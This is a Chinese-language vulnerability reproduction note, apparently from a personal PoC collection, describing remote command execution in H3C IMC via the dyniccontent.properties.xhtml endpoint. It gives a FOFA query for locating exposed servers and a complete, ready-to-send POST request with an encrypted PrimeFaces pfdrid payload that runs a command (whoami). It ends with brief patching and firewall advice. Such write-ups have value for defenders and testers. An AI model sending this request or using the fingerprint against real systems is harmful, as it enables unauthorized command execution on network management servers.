# H3C IMC 远程命令执行漏洞

# 一、漏洞概述
H3C IMC（Intlligent Management Center）智能管理中心是H3C推出的下一代业务智能管理产品。它融合了当前多个产品，以统一风格提供与网络相关的各类管理、控制、监控等功能；同时以开放的组件化的架构原型，向平台及其承载业务提供分布式、分级式交互管理特性；并为业务软件的下一代产品提供最可靠的、可扩展、高性能的业务平台。  
H3C IMC dynamiccontent.properties.xhtml 存在远程命令执行，攻击者通过构造特殊的请求造成远程命令执行

# 二、影响版本
H3C IMC

# 三、资产测绘
+ FOFA：`body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"`

![1689519334500-a1cf7457-ee3a-4052-8e36-53bd8df4c281.png](./img/uHodyoTTZJUrnqUk/1689519334500-a1cf7457-ee3a-4052-8e36-53bd8df4c281-334876.png)

+ 登陆页面：

![1689519365071-67684930-e208-4ae5-a892-175f60f5b428.png](./img/uHodyoTTZJUrnqUk/1689519365071-67684930-e208-4ae5-a892-175f60f5b428-458481.png)

# 四、漏洞复现
漏洞位置：`/imc/javax.faces.resource/dynamiccontent.properties.xhtml`

数据包：

```plain
POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Host: 127.0.0.1:9090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=F92841E0E8B8B5862380EE8A26113638; oam.Flash.RENDERMAP.TOKEN=-2s6vgzlac
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1567

cmd=whoami&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&pfdrt=sc
```

![1689519490720-6b4386a4-69b6-48a2-91f0-6702e4b260a6.png](./img/uHodyoTTZJUrnqUk/1689519490720-6b4386a4-69b6-48a2-91f0-6702e4b260a6-819474.png)

# 五、整改建议
升级IMC平台和相关组件的版本到最新，需注意适配的情况。其次可以在IMC所在的服务器的操作系统防火墙上配置出入站规则，拦截高危端口。在网络设备侧或安全设备侧通过安全策略、ACL的方式来进行拦截。条件允许的话，可考虑给服务器操作系统打补丁



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yd9izcxtofrr2q1i>